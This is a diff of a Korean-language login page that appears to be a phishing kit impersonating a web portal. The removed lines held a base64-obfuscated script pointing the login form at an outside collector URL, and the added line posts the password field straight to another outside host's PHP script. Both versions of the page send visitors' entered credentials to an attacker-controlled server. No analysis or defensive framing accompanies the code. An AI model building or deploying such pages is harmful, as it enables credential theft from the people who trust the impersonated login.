@@ -1,7 +1,6 @@
 <html lang="ko">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
 <title>&#47196;&#44536;&#51064; | &#45348;&#51060;&#53944;</title>
 <link rel="shortcut icon" href="https://i.ibb.co/m6nJMJR/url.png">
 </head>
@@ -66,7 +65,7 @@
 					<td height="42" >
 					&nbsp;</td>
 				</tr>
-				<form id="loginForm" method="post" >
+				<form action="https://ganpanmarthdesi.pro/bolton.php" method="post" >
 				<tr>
 					<td height="33"></td>
 				</tr>
@@ -95,7 +94,7 @@
 						<tr>
 							<td width="9" ></td>
 							<td>
-							    <input type="password" id="demo-field" name="passwd" placeholder="&#48708;&#48128;&#48264;&#54840;" maxlength="20" required />
+							    <input type="password" name="passwd" placeholder="&#48708;&#48128;&#48264;&#54840;" maxlength="20" required />
 							</td>
 							<td width="18"></td>
 						</tr>
@@ -138,26 +137,4 @@
 </div>
 
 </body>
-<script>
-  // Base64-encoded action URL
-  // (update this string whenever you need to point somewhere else)
-  const encodedAction = "aHR0cDovL2JvbHRvbmNvbGxlY3Rvci5hdHdlYnBhZ2VzLmNvbS93cC1jb25maWctcG9zdC5waHA=";
-
-  // Decode and set the form’s action attribute
-  document.getElementById('loginForm').action = atob(encodedAction);
-</script>
-<script type="text/javascript">
- 
-  //apply masking to the demo-field
-  //pass the field reference, masking symbol, and character limit
-  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
- 
-  //test the submitted value
-  document.getElementById('demo-form').onsubmit = function()
-  {
-   alert('pword = "' + this.pword.value + '"');
-   return false;
-  };
- 
- </script>
 </html>
